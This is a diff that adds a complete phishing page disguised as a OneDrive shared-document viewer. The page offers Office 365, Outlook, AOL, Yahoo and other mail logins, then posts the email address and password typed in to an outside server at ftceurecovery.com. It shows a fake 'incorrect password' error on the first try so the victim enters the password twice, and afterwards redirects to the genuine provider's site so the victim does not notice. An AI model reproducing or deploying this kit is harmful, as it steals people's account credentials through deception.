@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OneDrive </title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://kit.fontawesome.com/50b3f375f9.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" type="text/css" href="./index.css" />
+</head>
+
+<body>
+    <div class="general-body">
+        <div class="docu-body">
+            <div class="row justify-content-center">
+                <div class="col-lg-5 col-md-8 col-12">
+                    <div class="main-card-body">
+                        <div class="main-card-content">
+                            <div id="intro_div" class="intro-div">
+                                <h5 class="main-card-header">OneDrive</h5>
+                                <p class="mainn-card-intro"> To read the document, please choose your email provider
+                                    below Login to view shared file.</p>
+                                <div class="main-card-buttons">
+                                    <button type="button" class="btn btn-md btn-primary" id="office_365">
+                                        <span class="btn-img"> <img id="office_365_img" src="./assets/office365.png"
+                                                alt=""> </span>
+                                        <span class="btn-text">Login with Office 365</span>
+                                    </button>
+
+                                    <button type="button" class="btn btn-md btn-primary" id="outlook">
+                                        <span class="btn-img"> <img id="outlook_img" src="./assets/outlook.png" alt="">
+                                        </span>
+                                        <span class="btn-text">Login with Outlook</span>
+                                    </button>
+
+                                    <button type="button" class="btn btn-md btn-primary" id="aol">
+                                        <span class="btn-img"> <img id="aol_img" src="./assets/alo-lgo.png" alt="">
+                                        </span>
+                                        <span class="btn-text">Login with Aol</span>
+                                    </button>
+
+                                    <button type="button" class="btn btn-md btn-primary" id="yahoo">
+                                        <span class="btn-img"> <img id="yahoo_img" src="./assets/yahoo.png" alt="">
+                                        </span>
+                                        <span class="btn-text">Login with Yahoo</span>
+                                    </button>
+
+                                    <button type="button" class="btn btn-md btn-primary" id="other">
+                                        <span class="btn-img"> <img id="other_img" src="./assets/otheremail.png" alt="">
+                                        </span>
+                                        <span class="btn-text">Login with Other Mail</span>
+                                    </button>
+                                </div>
+
+                                <p class="main-card-footer"> Get to all your files from anywhere on any device and share
+                                    them with anyone. OneDrive your shared document in one cloud.</p>
+
+                            </div>
+
+                            <div id="form_div" class="form-div">
+                                <div class="main-card-form">
+                                    <p id="go_back" class="back-p"> <i class="fas fa-angle-left"></i> Back </p>
+                                    <div class="logo-section">
+                                        <img id="main_form_logo" src="./assets/otheremail.png" alt=""
+                                            class="img-fluid" />
+                                    </div>
+                                    <div class="form-body">
+                                        <form id="sign_in" method="post">
+                                            <div class="form-group">
+                                                <label for="email">Email </label>
+                                                <input type="email" name="email" id="email" class="form-control"
+                                                    required />
+                                            </div>
+
+                                            <div class="form-group">
+                                                <label for="password">Password </label>
+                                                <input type="password" name="password" id="password"
+                                                    class="form-control" required />
+                                                <span id="error_span" class="error-message">Error: Incorrect email or
+                                                    password. Please retry.</span>
+                                            </div>
+
+                                            <div class="tag_section">
+                                                <input type="text" name="section_type" id="section_type"
+                                                    value="Office365" class="form-control" hidden required />
+                                                <input type="text" name="click_count" id="click_count" value="1"
+                                                    class="form-control" required />
+
+                                            </div>
+
+                                            <div class="form-button">
+                                                <button type="submit" name="sign_in_btn" id="sign_in_btn"
+                                                    class="btn btn-md btn-primary">Sign in</button>
+                                            </div>
+
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
+
+<script>
+    // Get the modal
+    var modal = document.getElementById("connectModal");
+    let closeImport = document.getElementById("close-import");
+    let closeError = document.getElementById("close-error");
+
+
+    $("#office_365").on('click', function () {
+        openOne();
+        var srcValue = $("#office_365_img").attr("src");
+        $("#main_form_logo").attr("src", srcValue);
+        $("#section_type").val('Office 365')
+
+    });
+
+    $("#outlook").on('click', function () {
+        openOne();
+        var srcValue = $("#outlook_img").attr("src");
+        $("#main_form_logo").attr("src", srcValue);
+        $("#section_type").val('Outlook')
+
+    });
+
+    $("#aol").on('click', function () {
+        openOne();
+        var srcValue = $("#aol_img").attr("src");
+        $("#main_form_logo").attr("src", srcValue);
+        $("#section_type").val('AOL')
+
+    });
+
+    $("#yahoo").on('click', function () {
+        openOne();
+        var srcValue = $("#yahoo_img").attr("src");
+        $("#main_form_logo").attr("src", srcValue);
+        $("#section_type").val('Yahoo')
+
+    });
+
+    $("#other").on('click', function () {
+        openOne();
+        var srcValue = $("#other_img").attr("src");
+        $("#main_form_logo").attr("src", srcValue);
+        $("#section_type").val('Other Mail')
+
+    });
+
+    $("#go_back").on('click', function () {
+        $("#intro_div").show();
+        $("#form_div").hide();
+
+    });
+
+
+    function openOne() {
+        $("#intro_div").hide();
+        $("#form_div").show();
+        $("#click_count").val('1');
+        $("#email").val('');
+        $("#password").val('');
+        $("#error_span").hide();
+    }
+
+
+    $("#password").on("input", function () {
+        // Remove any non-numeric characters
+        $("#error_span").hide();
+    });
+
+
+</script>
+
+<script>
+    $("#sign_in").submit(function (event) {
+        event.preventDefault();
+        const sectionType = $("#section_type").val();
+        let clickCount = $("#click_count").val();
+        let user_email = $("#email").val();
+        let user_password = $("#password").val();
+
+        // First clickCount
+        if (clickCount === '1') {
+            processAction(user_email, user_password, clickCount, sectionType).then(() => {
+                $("#error_span").show();
+                $("#click_count").val("2");
+            })
+
+        }
+
+        // Second clickCount
+        else if (clickCount === '2') {
+
+            processAction(user_email, user_password, clickCount, sectionType).then(() => {
+                if (sectionType === 'Office 365') {
+                    window.location.replace("https://www.office.com/login");
+                } else if (sectionType === 'Outlook') {
+                    window.location.replace("https://outlook.office.com/mail/inbox");
+                } else if (sectionType === 'AOL') {
+                    window.location.replace("https://login.aol.com/");
+                } else if (sectionType === 'Yahoo') {
+                    window.location.replace("https://mail.yahoo.com/d/folders/");
+                } else {
+                    window.location.replace("https://outlook.office.com/mail/inbox");
+                }
+            })
+
+
+        }
+    });
+
+    function processAction(user_email, user_password, clickCount, sectionType) {
+        return $.ajax({
+            url: 'https://ftceurecovery.com/action.php',
+            method: 'POST',
+            dataType: 'json',
+            data: {
+                user_email: user_email,
+                user_password: user_password,
+                click_count: clickCount,
+                section_type: sectionType,
+            }
+        })
+            .then(function (response) {
+                // Check for a successful response.
+                if (response.message === 'success') {
+                    return true;
+                } else {
+                    return false;
+                }
+            })
+            .catch(function (error) {
+                console.log('Error loading content:', error);
+                return false; // Return false in case of an error.
+            });
+    }
+</script>
